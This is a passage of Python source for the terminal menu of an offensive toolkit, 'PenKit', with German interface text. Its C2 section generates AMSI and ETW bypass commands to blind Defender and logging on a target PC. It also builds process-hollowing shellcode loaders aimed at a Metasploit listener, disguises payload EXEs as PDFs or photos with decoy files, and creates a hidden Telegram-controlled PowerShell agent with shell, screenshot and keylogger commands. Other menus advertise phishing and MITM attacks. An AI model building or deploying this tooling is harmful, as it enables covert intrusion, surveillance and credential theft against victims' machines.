            "AMSI = Windows-Schnittstelle die PowerShell-Befehle an Defender weitergibt.",
            "Dieser Bypass patcht AMSI im Speicher → Defender sieht den Code nicht mehr.",
            "",
            "Methoden:",
            "  reflection    — ändert AMSI-Flag via .NET Reflection (sehr zuverlässig, default)",
            "  memory_patch  — überschreibt AmsiScanBuffer direkt im RAM (noch stärker)",
            "",
            "Den generierten Befehl auf dem Ziel-PC in PowerShell ausführen.",
        ])
        print()
        method = prompt("Methode [reflection / memory_patch]  (Enter = reflection)") or "reflection"
        try:
            from tools.c2.amsi_bypass import build_amsi_bypass
            cmd = build_amsi_bypass(method)
            print(f"\n  {G}[+] Fertig! Diesen Befehl auf dem Ziel-PC ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
            print(f"  {DIM}Danach kannst du beliebigen PS-Code ohne Defender-Erkennung ausführen.{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "3":
        banner()
        section("👁️  ETW BYPASS", "Windows Event Tracing abschalten")
        info_box([
            "ETW = Event Tracing for Windows — protokolliert ALLE PowerShell-Aktionen.",
            "Dieser Bypass patcht EtwEventWrite in ntdll.dll → alle Logs blind.",
            "Wirkung: EDR, SIEM und Windows Event Viewer sehen nichts mehr.",
            "",
            "Kein Input nötig — Befehl wird direkt generiert und angezeigt.",
        ])
        print()
        try:
            from tools.c2.amsi_bypass import build_etw_bypass
            cmd = build_etw_bypass()
            print(f"  {G}[+] Diesen Befehl auf dem Ziel-PC ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "4":
        banner()
        section("🔀  AMSI + ETW KOMBINIERT", "Alle Bypasses in einem einzigen Befehl")
        info_box([
            "Kombiniert in einem Base64-codierten PowerShell-Befehl:",
            "  ✓  AMSI Bypass    → Defender sieht deinen Code nicht",
            "  ✓  ETW Bypass     → Windows Logs blind",
            "  ✓  ScriptBlock    → PS-Verlaufs-Logging deaktiviert",
            "",
            "Das ist der empfohlene erste Schritt vor jeder weiteren Aktion.",
            "Kein Input nötig — direkt kopieren und auf Ziel ausführen.",
        ])
        print()
        try:
            from tools.c2.amsi_bypass import build_combined_bypass
            cmd = build_combined_bypass()
            print(f"  {G}[+] Alles-in-einem Bypass — auf Ziel ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "5":
        banner()
        section("💉  PROCESS HOLLOWING", "Shellcode in legitimen Windows-Prozess einschleusen")
        info_box([
            "Process Hollowing = Payload wird in svchost.exe / RuntimeBroker.exe injiziert.",
            "Im Task-Manager sieht man nur einen normalen Windows-Prozess — kein Verdacht.",
            "Der Shellcode läuft komplett im RAM — keine Datei auf der Festplatte.",
            "",
            "LHOST = deine Kali IP  (wo Metasploit lauscht)",
            "LPORT = dein Listener-Port  (gleich wie im Metasploit handler)",
            "",
            "Wichtig: Demo-Shellcode (NOP sled) wird eingebaut.",
            "Ersetze mit echtem msfvenom-Shellcode — steht in der ANLEITUNG.",
        ])
        print()
        info_box([
            "LHOST = deine Kali IP  →  ip a | grep 192",
        ])
        lhost = prompt("LHOST — Kali IP (z.B. 192.168.1.10)")
        if not lhost:
            print(f"  {Y}[!] Pflichtfeld.{R}")
            wait_key()
            return
        info_box([
            "LPORT = Port auf dem Metasploit lauscht  →  Empfohlen: 443",
        ])
        try:
            lport = int(prompt("LPORT (default: 443)") or "443")
        except ValueError:
            lport = 443
        print(f"\n  {RD}⛔  Tippe:{R}  {W}I own this device{R}\n")
        if prompt("Bestätigung").strip().lower() != "i own this device":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return
        try:
            from tools.c2.process_hollow import generate as ph_gen, HOLLOW_TARGETS
            import random as _r
            target = _r.choice(HOLLOW_TARGETS)
            code = ph_gen(b"\x90" * 8, target_process=target)
            out = f"/tmp/hollow_{lhost.replace('.','_')}_{lport}.ps1"
            with open(out, "w") as f:
                f.write(code)
            print(f"\n  {G}[+] Gespeichert: {out}{R}")
            print(f"  {C}[*] Ziel-Prozess: {target}{R}")
            print(f"  {DIM}Nächster Schritt: echten Shellcode einbauen — siehe Full Package ANLEITUNG{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "6":
        banner()
        section("🎭  PAYLOAD TARNEN", "Als PDF / Foto / Word-Datei verkleiden")
        info_box([
            "Erstellt eine EXE-Datei die aussieht wie eine PDF/Foto/Word-Datei:",
            "  → Echtes Icon (PDF-Symbol, Foto-Symbol, Word-Symbol)",
            "  → Öffnet gleichzeitig eine echte Decoy-Datei → kein Verdacht",
            "  → Payload läuft versteckt im Hintergrund",
            "",
            "Benötigt: pyinstaller  →  pip3 install pyinstaller --break-system-packages",
        ])
        print()
        info_box([
            "payload.ps1 = die PS1-Datei die du mit Option 1 gebaut hast",
            "  → Normalerweise in /tmp/penkit_c2_<ID>/payload.ps1",
        ])
        ps1_path = prompt("Pfad zur payload.ps1")
        if not ps1_path or not os.path.exists(ps1_path):
            print(f"  {Y}[!] Datei nicht gefunden: {ps1_path}{R}")
            wait_key()
            return
        info_box([
            "Tarnung wählen:",
            "  pdf   → sieht aus wie ein PDF-Dokument  (Standard, sehr glaubwürdig)",
            "  photo → sieht aus wie ein JPEG-Foto",
            "  word  → sieht aus wie ein Word-Dokument (.docx)",
        ])
        dtype = prompt("Tarnung [pdf / photo / word]  (Enter = pdf)") or "pdf"
        info_box([
            "Decoy-Datei (optional): eine echte PDF/Foto die beim Doppelklick geöffnet wird.",
            "  → Z.B. eine harmlose Rechnung, ein Urlaubsfoto, etc.",
            "  → Leer lassen wenn keine Decoy-Datei vorhanden.",
        ])
        decoy = prompt("Pfad zur Decoy-Datei  (Enter = keine)") or None
        if decoy and not os.path.exists(decoy):
            print(f"  {Y}[!] Decoy nicht gefunden — wird ignoriert.{R}")
            decoy = None
        out_dir = prompt("Ausgabe-Ordner  (Enter = /tmp)") or "/tmp"
        print()
        try:
            from tools.c2.disguise import build_disguised_exe
            async for line in build_disguised_exe(ps1_path, dtype, decoy, out_dir):
                print_output_line(line)
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "7":
        banner()
        section("📱  TELEGRAM C2 AGENT", "Windows PS1 das via Telegram gesteuert wird")
        info_box([
            "Der Agent läuft auf dem Ziel-Windows als PowerShell-Skript.",
            "Er fragt alle N Sekunden Telegram nach Befehlen — kein eingehender Port nötig.",
            "",
            "Was du brauchst:",
            "  1. Telegram Bot Token  → @BotFather auf Telegram → /newbot",
            "  2. Deine Chat-ID       → @userinfobot auf Telegram anschreiben",
            "",
            "Danach kannst du dem Bot direkt Befehle schicken:",
            "  !shell whoami   !screenshot   !sysinfo   !wifi   !keylog start   !help",
        ])
        print()

        # Gespeicherte Config laden falls vorhanden
        from tools.c2.telegram_bot import load_config, save_config
        saved = load_config()
        if saved:
            print(f"  {G}[*] Gespeicherte Config gefunden{R}  (Token: ...{saved[0][-8:]}  Chat: {saved[1]})")
            use_saved = prompt("Gespeicherte Config verwenden? [j/n]  (Enter = j)").lower()
            if use_saved not in ("n", "nein", "no"):
                token, chat_id = saved
            else:
                token = chat_id = ""
        else:
            token = chat_id = ""

        if not token:
            info_box([
                "Bot-Token = langer String den @BotFather gibt, z.B.:",
                "  1234567890:ABCdefGHijklMNOpqrSTUvwxYZ-abc123",
            ])
            token = prompt("Bot-Token")
            if not token:
                wait_key(); return

        if not chat_id:
            info_box([
                "Chat-ID = deine persönliche Telegram-ID, z.B. 123456789",
                "  → Schreibe @userinfobot auf Telegram, er antwortet mit deiner ID",
                "  → ODER nutze Option 8 (Bot Setup) um sie automatisch zu finden",
            ])
            chat_id = prompt("Chat-ID  (deine Telegram-Nutzer-ID)")
            if not chat_id:
                wait_key(); return

        try:
            interval = int(prompt("Polling-Intervall in Sekunden  (Enter = 10)") or "10")
        except ValueError:
            interval = 10

        save_config(token, chat_id)

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            from tools.c2.telegram_agent import generate as ag_gen
            ps1_code = ag_gen(token, chat_id, interval)
            out_path = f"/tmp/penkit_agent_{chat_id}.ps1"
            with open(out_path, "w") as f:
                f.write(ps1_code)
            print(f"  {G}[+] Agent gespeichert: {out_path}{R}")
            print(f"  {G}[+] Größe: {len(ps1_code)} Zeichen{R}")
            print()
            print(f"  {C}Auf dem Ziel-PC ausführen:{R}")
            print(f"  {W}  powershell -ep bypass -w hidden -File agent.ps1{R}")
            print()
            print(f"  {DIM}Agent fragt alle {interval}s nach Befehlen.{R}")
            print(f"  {DIM}Schreibe dem Bot auf Telegram: !help{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "8":
        banner()
        section("🤖  TELEGRAM BOT SETUP", "Token verifizieren + Chat-ID finden")
        info_box([
            "Schritt 1: Bot erstellen",
            "  → Öffne Telegram → suche @BotFather → schreibe /newbot",
            "  → Gib dem Bot einen Namen (z.B. 'MyHelper') und Username (z.B. 'myhelper_bot')",
            "  → BotFather gibt dir den Token (langer String mit :)",
            "",
            "Schritt 2: Chat-ID finden",
            "  → Schreibe deinem neuen Bot eine beliebige Nachricht",
            "  → PenKit findet die Chat-ID automatisch",
        ])
        print()
        token = prompt("Bot-Token")
        if not token:
            wait_key()
            return
        print()
        try:
            from tools.c2.telegram_bot import setup_bot, get_chat_id, BotConfig, save_config
            # Erst Token verifizieren
            async for line in setup_bot(BotConfig(token=token, chat_id="")):
                print_output_line(line)
                if "ungültig" in line.lower():
                    wait_key()
                    return
            print()
            print(f"  {Y}[*] Schreibe jetzt dem Bot eine Nachricht auf Telegram (z.B. 'hallo'){R}")
            print(f"  {DIM}  Dann Enter drücken...{R}")
            input()
            print()
            found_id = ""
            async for line in get_chat_id(token):
                print_output_line(line)
                if "Chat-ID gefunden:" in line:
                    import re
                    m = re.search(r'Chat-ID gefunden:\s*(-?\d+)', line)
                    if m:
                        found_id = m.group(1)
            if found_id:
                save_config(token, found_id)
                print(f"\n  {G}[+] Config gespeichert!{R}")
                print(f"  {C}Token  : {token[:20]}...{R}")
                print(f"  {C}Chat-ID: {found_id}{R}")
                print(f"\n  {DIM}Jetzt C2 → Agent generieren (Option 7){R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()


# ═════════════════════════════════════════════════════════════════════════════
# BOOT SEQUENCE
# ═════════════════════════════════════════════════════════════════════════════

def boot_sequence():
    clr()
    lines = [
        f"{DG}[{G}*{DG}]{R} Initializing PenKit TUI v3...",
        f"{DG}[{G}*{DG}]{R} Loading modules...",
        f"{DG}[{G}*{DG}]{R} Checking privileges...",
        f"{DG}[{G}+{DG}]{G} Root access confirmed{R}",
        f"{DG}[{G}*{DG}]{R} All systems operational",
    ]
    for line in lines:
        slow(f"  {line}", delay=0.012)
        time.sleep(0.08)
    time.sleep(0.3)


# ═════════════════════════════════════════════════════════════════════════════
# MAIN LOOP
# ═════════════════════════════════════════════════════════════════════════════

async def main_menu():
    boot_sequence()

    while True:
        banner()
        print(f"  {DIM}┌{'─'*66}┐{R}")
        print(f"  {DIM}│{'  🔴  RED TEAM':^66}│{R}")
        print(f"  {DIM}├{'─'*66}┤{R}")
        menu_item(" 1", "📡  WiFi Attacks",          "🟠", "WPA2/3 crack, Evil Twin, PMKID, Deauth, Handshake")
        menu_item(" 2", "🌐  Network Intelligence",  "🟠", "Nmap scan, CVE check, topology map, attack chain")
        menu_item(" 3", "💻  Web Attack",            "🟠", "SQLmap, ffuf, nikto, XSS, LFI, BeEF")
        menu_item(" 4", "🔑  Passwords & Hashes",   "🟡", "Hashcat GPU, John, Hydra brute-force, hash detect")
        menu_item(" 5", "☠️   MITM",                  "🔴", "ARP spoof, SSL strip, Responder, DNS poison")
        menu_item(" 6", "🔍  OSINT Recon",           "🟡", "Emails, subdomains, Sherlock 300+ platforms, report")
        menu_item(" 7", "🎣  Phishing Suite",        "⛔", "Fake Login Pages, Email-Kampagnen, GoPhish, Creds")
        menu_item(" 9", "💀  C2 / RAT Payloads",     "⛔", "AMSI bypass, fileless shellcode, hollow, disguise")
        print(f"  {DIM}├{'─'*66}┤{R}")
        print(f"  {DIM}│{'  🔵  BLUE TEAM  /  🃏  JOKER':^66}│{R}")
        print(f"  {DIM}├{'─'*66}┤{R}")
        menu_item(" 8", "🔵  Blue Team Defense",     "🟢", "ARP watch, auth.log, honeypot, port monitor")
        menu_item(" J", "🃏  Joker / Pranks",        "🟡", "Fake BSOD, Kahoot bot, browser chaos, pranks")
        print(f"  {DIM}└{'─'*66}┘{R}")
        print()
        menu_item(" 0", "❌  Exit", "")

        choice = prompt("penkit")

        dispatch = {
            "1": menu_wifi,
            "2": menu_network,
            "3": menu_web,
            "4": menu_passwords,
            "5": menu_mitm,
            "6": menu_osint,
            "7": menu_phishing,
            "8": menu_blueteam,
            "9": menu_c2,
            "j": menu_joker,
            "J": menu_joker,
        }

        if choice == "0":
            clr()
            slow(f"\n  {G}[*] Goodbye.{R}\n", delay=0.03)
            sys.exit(0)
        elif choice in dispatch:
            await dispatch[choice]()


def run():
    try:
        asyncio.run(main_menu())
    except KeyboardInterrupt:
        print(f"\n\n  {G}[*] Session terminated.{R}\n")
        sys.exit(0)


if __name__ == "__main__":
    run()
